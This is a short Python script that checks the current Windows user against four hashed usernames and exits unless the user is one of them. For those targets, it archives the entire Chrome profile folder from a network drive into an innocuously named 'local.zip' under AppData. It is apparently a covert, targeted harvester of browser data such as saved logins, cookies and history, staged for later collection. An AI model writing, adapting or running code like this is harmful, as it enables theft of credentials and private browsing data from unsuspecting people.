import os
import zipfile
import hashlib
import getpass

username = getpass.getuser()
destpath = os.path.join('C:\\Users', username, 'AppData', 'local.zip')

people = ['175e66a05ccd138f3b7faa0c0522dcee36708b0dcce8817a5df77e8cf8fe510c',
'52ed847ee688b3c0cef6d1813d3e35ac943ca25ca3d1b2958a735c083d89f421',
'44d91624757e703ed94d8433bc71b210400635b9629f8e7a02673882af8246b6',
'3070c4f2abd900f608f000f1d4df8963ca7564c74e76dfb60cac2d785adbe74b']

hash = hashlib.sha256(username.encode('utf-8')).hexdigest()
print(hash)
if hash in people:
    print('do it')
else:
    exit(0)

import sys, os, traceback, types

chromepath = 'U:\Appscfg.MCS\AppData.W10\Google\Chrome'

def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            try:
                ziph.write(os.path.join(root, file))
            except PermissionError:
                print("permission error")

if __name__ == '__main__':
    zipf = zipfile.ZipFile(destpath , 'w', zipfile.ZIP_DEFLATED)
    zipdir(chromepath, zipf)
    zipf.close()